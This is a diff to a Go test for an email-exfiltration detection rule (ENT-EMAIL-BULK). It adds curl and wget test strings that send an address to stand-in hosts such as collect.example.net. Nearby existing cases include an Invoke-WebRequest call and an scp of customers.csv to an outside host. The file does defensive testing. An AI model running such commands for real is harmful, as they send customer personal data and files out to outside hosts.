@@ -76,6 +76,11 @@ func TestEmailRuleSkipsAddressShapedPathSegments(t *testing.T) {
 		"Invoke-WebRequest -Uri collect.example.net/u/jane.doe@acme-corp.com",
 		"scp customers.csv ops@backup.example.net:/srv/drop/jane.doe@acme-corp.com/",
 		`copy x \\files.example.net\drop\jane.doe@acme-corp.com\`,
+		// GAP-2037: a query value that starts with "/" is still part of a
+		// URL to another host.
+		`curl "https://api.vendor.io/v1/lookup?path=/users/jane.doe@acme-corp.com"`,
+		"curl https://collect.example.net/u?id=/jane.doe@acme-corp.com/",
+		`wget "https://drop.example.org/x?to=/jane.doe@acme-corp.com"`,
 	} {
 		if firstAcceptedRuleMatch(rule, text) == nil {
 			t.Errorf("ENT-EMAIL-BULK did not fire on %q", text)
